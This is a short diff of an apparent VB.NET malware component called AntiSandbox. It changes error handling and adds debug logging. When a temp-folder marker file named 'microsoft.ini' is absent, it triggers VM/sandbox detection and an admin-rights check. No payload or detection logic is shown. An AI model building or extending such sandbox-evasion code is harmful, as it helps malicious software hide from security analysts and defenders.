@@ -3,7 +3,7 @@ Imports System.Security.Principal
 Imports Microsoft.Win32
 
 Module AntiSandbox
-    Public AntisDetected As Boolean = False
+    Private AntisDetected As Boolean = False
     Public Function IsAdmin() As Boolean
         Try
             Dim id As WindowsIdentity = WindowsIdentity.GetCurrent()
@@ -15,15 +15,21 @@ Module AntiSandbox
         Catch
             Return False
         End Try
-
     End Function
     Public Sub RunAntis()
-        On Error Resume Next
-
-        If Not IO.File.Exists(IO.Path.GetTempPath & "microsoft.ini") Then
-            SearchVM()
-        End If
-
+        Try
+            If Config.Variables.Debug Then
+                Console.WriteLine("Anti-Sanbox working...")
+            End If
+            If Not IO.File.Exists(IO.Path.GetTempPath & "microsoft.ini") Then
+                SearchVM()
+                IsAdmin()
+            End If
+        Catch ex As Exception
+            If Config.Variables.Debug Then
+                Console.WriteLine("Anti-Sanbox error: " & ex.ToString)
+            End If
+        End Try
     End Sub
     Public Sub SearchVM()
         Try
